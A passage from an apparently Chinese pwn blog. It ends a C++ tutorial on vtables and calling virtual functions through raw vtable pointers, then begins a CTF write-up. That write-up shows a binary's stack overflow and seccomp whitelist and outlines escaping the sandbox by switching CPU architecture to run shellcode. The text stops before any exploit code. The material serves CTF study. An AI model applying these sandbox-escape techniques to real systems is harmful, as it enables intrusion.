   <span class="built_in">printf</span>(<span class="string">&quot;Rectangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Triangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Triangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//void sayHello()&#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;Triangle\n&quot;);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun2\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Shape* shape)</span></span>&#123;</span><br><span class="line">    shape-&gt;<span class="built_in">bar</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">area</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">sayHello</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Shape* shape = <span class="keyword">new</span> <span class="built_in">Rectangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Triangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Shape</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>定义了一个 Shape 类，Rectangle 类和 Triangle 类都继承 Shape 类</li>
<li>在 Shape 类中：area 和 sayHello 都是虚函数（用 virtual 进行修饰）</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> g++ test.cpp -o test -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Rectangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">12</span></span><br><span class="line">Rectangle</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Triangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">6</span></span><br><span class="line">Shape <span class="comment">/* Triangle中没有覆写sayHello,所以还是执行父类的sayHello */</span></span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Shape <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">0</span></span><br><span class="line">Shape </span><br></pre></td></tr></table></figure>
<ul>
<li>虚函数可以被子类覆写（名称&amp;格式必须相同），调用时优先调用自己的虚函数</li>
</ul>
<p>这就是多态，使用虚函数使子类可以覆写父类，提高了函数的灵活性</p>
<h2 id="Cpp-动态绑定"><a href="#Cpp-动态绑定" class="headerlink" title="Cpp-动态绑定"></a>Cpp-动态绑定</h2><p>一般情况下，在编译期间（包括链接期间）就能完成符号决议（为符号绑定相应的地址），不用等到程序执行时再进行额外的操作，这称为静态绑定，如果编译期间不能完成符号决议，就必须在程序执行期间完成，这称为动态绑定</p>
<ul>
<li>非虚成员函数属于静态绑定：编译器在编译期间，根据指针（或对象）的类型完成了绑定 </li>
<li>调用虚函数时，就会发生动态绑定，所谓动态绑定，就是在运行时，虚函数会 <strong>根据绑定对象的实际类型，选择调用函数的版本</strong>（因为 cpp 的多态机制，我们无法在编辑阶段完成符号决议，因为不清楚该虚函数是A类，B类，还是C类）<ul>
<li>例如：我们不清楚符号 area 会绑定 Shape 中的代码地址，还是 Triangle 中的代码地址，或者是 Rectangle 中的代码地址</li>
</ul>
</li>
</ul>
<p>如果一个类包含了虚函数，那么在创建对象时会额外增加一张表，表中的每一项都是虚函数的入口地址，这张表就是虚函数表，也称为 vtable</p>
<p>可以认为虚函数表是一个数组，为了把对象和虚函数表关联起来，编译器会在对象中安插一个指针，指向虚函数表的起始位置，这个指针就是 VPTR 指针（在以后的 pwn 中会遇到）</p>
<h2 id="Cpp-虚表"><a href="#Cpp-虚表" class="headerlink" title="Cpp-虚表"></a>Cpp-虚表</h2><p>为了实现 C++ 的多态，C++ 使用了一种动态绑定的技术，这个技术的核心是虚函数表</p>
<ul>
<li>每个包含了虚函数的类都包含一个虚表</li>
</ul>
<p>我们知道，当一个类（A）继承另一个类（B）时，类A会继承类B的函数的调用权，所以如果一个基类包含了虚函数，那么其继承类也可调用这些虚函数，换句话说，一个类继承了包含虚函数的基类，那么这个类也拥有自己的虚表</p>
<p>我们来看以下的代码：（紧接上面的例子）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ShapeP :%ld\n&quot;</span>,<span class="keyword">sizeof</span>(ShapeP)); <span class="comment">/* ShapeP就是去掉虚函数的Shape */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Shape :%ld\n&quot;</span>,<span class="keyword">sizeof</span>(Shape));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Rectangle: %ld\n&quot;</span>,<span class="keyword">sizeof</span>(Rectangle));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Triangle: %ld\n&quot;</span>,<span class="keyword">sizeof</span>(Triangle));</span><br></pre></td></tr></table></figure>
<ul>
<li>Shape，Rectangle，Triangle，都应该有虚表</li>
<li>ShapeP 应该没有虚表</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ShapeP :<span class="number">8</span></span><br><span class="line">Shape :<span class="number">16</span></span><br><span class="line">Rectangle: <span class="number">16</span></span><br><span class="line">Triangle: <span class="number">16</span></span><br></pre></td></tr></table></figure>
<ul>
<li>很明显，编译器多分配了8字节，用于存储虚表头指针</li>
</ul>
<p>内存布局如下：</p>
<ul>
<li>Shape：定义了虚函数 area，sayHello</li>
</ul>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1654235784704-1654239107513.png" class width="1654235784704"> 
<ul>
<li>Rectangle：覆写了虚函数 area，sayHello，定义了虚函数 fun1</li>
</ul>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1654235831258-1654239107513.png" class width="1654235831258"> 
<ul>
<li>Triangle：覆写了虚函数 area，继承了虚函数 sayHello，定义了虚函数 fun2</li>
</ul>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1654235878937-1654239107513.png" class width="1654235878937"> 
<p>我们可以用另一种方式进行验证：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> width,height;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Shape</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>)&#123;</span><br><span class="line">        width = a;</span><br><span class="line">        height = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bar fun width:%d\n&quot;</span>,width);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Rectangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Triangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Triangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//void sayHello()&#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;Triangle\n&quot;);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun2\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Shape* shape)</span></span>&#123;</span><br><span class="line">    shape-&gt;<span class="built_in">bar</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">area</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">sayHello</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">(Shape* shape)</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*BAR_FUN)</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*AREA_FUN)</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*SAYHELLO_FUN)</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">void</span>* (ADRESS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bar不是虚函数,直接赋值函数指针 */</span></span><br><span class="line">    BAR_FUN bar_fun = (BAR_FUN)(&amp;Shape::bar); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 获取vtable地址 */</span></span><br><span class="line">    ADRESS *vtable_addr = *((ADRESS**)(shape)); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 通过vtable赋值函数指针 */</span></span><br><span class="line">    AREA_FUN area_fun = (AREA_FUN)(*vtable_addr); </span><br><span class="line">    SAYHELLO_FUN sayhello_fun = (SAYHELLO_FUN)*(vtable_addr+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 通过函数指针执行虚表函数 */</span></span><br><span class="line">    <span class="built_in">bar_fun</span>((<span class="keyword">void</span>*)shape);</span><br><span class="line">    <span class="built_in">area_fun</span>((<span class="keyword">void</span>*)shape);</span><br><span class="line">    <span class="built_in">sayhello_fun</span>((<span class="keyword">void</span>*)shape);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Shape* shape = <span class="keyword">new</span> <span class="built_in">Rectangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="built_in">test2</span>(shape);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;------\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Triangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="built_in">test2</span>(shape);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;------\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Shape</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="built_in">test2</span>(shape);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;------\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>test2 和 test 完全不同</li>
<li>test2 没有采用 cpp 规定的形式来调用虚表函数，而是利用函数指针来调用它们</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> g++ test.cpp -o test -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Rectangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">12</span></span><br><span class="line">Rectangle</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Rectangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">12</span></span><br><span class="line">Rectangle</span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Triangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">6</span></span><br><span class="line">Shape</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Triangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">6</span></span><br><span class="line">Shape</span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Shape <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">0</span></span><br><span class="line">Shape</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Shape <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">0</span></span><br><span class="line">Shape</span><br><span class="line">------</span><br></pre></td></tr></table></figure>
<ul>
<li>可以正常执行，test 和 test2 没有任何差别</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/02/gadget+ORA+CMP%20trick/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/02/gadget+ORA+CMP%20trick/" class="post-title-link" itemprop="url">gadget+ORA+CMP trick</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-02 01:52:14 / Modified: 01:54:31" itemprop="dateCreated datePublished" datetime="2022-06-02T01:52:14+08:00">2022-06-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Gadget 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gadget: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), statically linked, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>64位，statically，开了NX</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p>白名单：fstat，read，alarm</p>
<p><strong>入侵分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  alarm_sys(<span class="number">48LL</span>, argv, envp);</span><br><span class="line">  install_seccomp(<span class="number">48LL</span>, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">  read_sys(input);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)&amp;locret_401002;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">read_sys</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = sys_read(<span class="number">0</span>, a1, <span class="number">0xC0</span>uLL); <span class="comment">// 输入“0xC0”字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有栈溢出，但是开了沙盒，只允许 fstat，read，alarm 函数被调用</p>
<p>这里可以使用一种名为：沙盒逃逸的技术，因为每个架构的系统调用号不同，如果能够更改架构，就能绕过沙盒的限制，要实现这点需要3个条件：</p>
<ul>
<li>第一个对 arch 没有检查</li>
<li>第二个需要对特定的系统调用号没有禁用，比如 Linux 的 32 位 execve 的系统调用号是 11，64 位的系统调用号是 59，如果更改 64 位为 32 位就需要没有禁用 32 位 execve 的系统调用号 11，反之更改 32 位为 64 位则需要没有禁用 64 位的 execve 系统调用号 59 </li>
<li>第三需要能够使用 sys_mmap 或 sys_mprotect，因为如果要改变 arch 一般找不到合适的 gadget 使用，所以需要使用 shellcode，而使用 shellcode 需要有一块可写可执行的内存，而这块内存可以使用 sys_mmap 或 sys_mprotect 来获取</li>
</ul>
